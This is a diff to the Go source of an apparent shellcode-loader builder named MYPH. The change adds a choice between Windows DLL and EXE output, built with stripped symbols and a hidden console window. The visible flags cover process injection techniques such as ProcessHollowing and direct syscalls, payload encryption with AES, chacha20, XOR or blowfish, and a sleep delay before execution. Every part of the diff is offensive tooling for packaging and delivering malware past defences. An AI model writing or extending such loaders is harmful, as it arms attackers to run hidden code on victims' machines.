@@ -14,7 +14,7 @@ import (
 )
 
 const MYPH_TMP_DIR = "/tmp/myph-out"
-const MYPH_TMP_WITH_PAYLOAD = "/tmp/myph-out/payload.exe"
+const MYPH_TMP_WITH_PAYLOAD = "/tmp/myph-out/payload."
 
 const ASCII_ART = `
               ...                                        -==[ M Y P H ]==-
@@ -43,10 +43,22 @@ const ASCII_ART = `
     `
 
 func BuildLoader(opts *Options) *exec.Cmd {
-	if true {
-		return exec.Command("go", "build", "-ldflags", "-s -w -H=windowsgui", "-o", "-buildmode=c-shared", "payload.dll", ".")
-	} else {
+	os.Setenv("GOOS", opts.OS)
+	os.Setenv("GOARCH", opts.Arch)
+	os.Setenv("CGO_ENABLED", "1")
+	os.Setenv("CC", "x86_64-w64-mingw32-gcc")
+
+	if opts.BuildType == "dll" {
+		fmt.Println("[*] Compile payload as dll...")
+
+		return exec.Command("go", "build", "-buildmode=c-shared", "-ldflags", "-s -w -H=windowsgui", "-o", "payload.dll", ".")
+	} else if opts.BuildType == "exe" {
+		fmt.Println("[*] Compile payload as executable...")
+
 		return exec.Command("go", "build", "-ldflags", "-s -w -H=windowsgui", "-o", "payload.exe", ".")
+	} else {
+		fmt.Printf("[!] Buildtype format not supported!")
+		return nil
 	}
 }
 
@@ -224,14 +236,12 @@ func GetParser(opts *Options) *cobra.Command {
 					encodedKey,
 					encodedShellcode,
 					opts.SleepTime,
+					opts.BuildType == "dll",
 				),
 			)
 			if err != nil {
 				panic(err)
 			}
-
-			os.Setenv("GOOS", opts.OS)
-			os.Setenv("GOARCH", opts.Arch)
 
 			templateFunc := loaders.SelectTemplate(opts.Technique)
 			if templateFunc == nil {
@@ -264,7 +274,11 @@ func GetParser(opts *Options) *cobra.Command {
 				os.Exit(1)
 			}
 
-			tools.MoveFile(MYPH_TMP_WITH_PAYLOAD, opts.OutName)
+			format := "exe"
+			if opts.BuildType == "dll" {
+				format = "dll"
+			}
+			tools.MoveFile(MYPH_TMP_WITH_PAYLOAD+format, opts.OutName+"."+format)
 			os.RemoveAll(MYPH_TMP_DIR)
 
 			fmt.Printf("[+] Done! Compiled payload: %s\n", opts.OutName)
@@ -280,6 +294,7 @@ func GetParser(opts *Options) *cobra.Command {
 	rootCmd.Flags().StringVarP(&opts.ShellcodePath, "shellcode", "s", defaults.ShellcodePath, "shellcode path")
 	rootCmd.Flags().StringVarP(&opts.Target, "process", "p", defaults.Target, "target process to inject shellcode to")
 	rootCmd.Flags().StringVarP(&opts.Technique, "technique", "t", defaults.Technique, "shellcode-loading technique (allowed: CRT, CRTx, CreateFiber, ProcessHollowing, CreateThread, Syscall, Etwp)")
+	rootCmd.Flags().StringVarP(&opts.BuildType, "builtype", "b", defaults.BuildType, "define the output type (allowed: exe, dll)")
 	rootCmd.Flags().VarP(&opts.Encryption, "encryption", "e", "encryption method. (allowed: AES, chacha20, XOR, blowfish)")
 	rootCmd.Flags().StringVarP(&opts.Key, "key", "k", "", "encryption key, auto-generated if empty. (if used by --encryption)")
 	rootCmd.Flags().UintVarP(&opts.SleepTime, "sleep-time", "", defaults.SleepTime, "sleep time in seconds before executing loader (default: 0)")
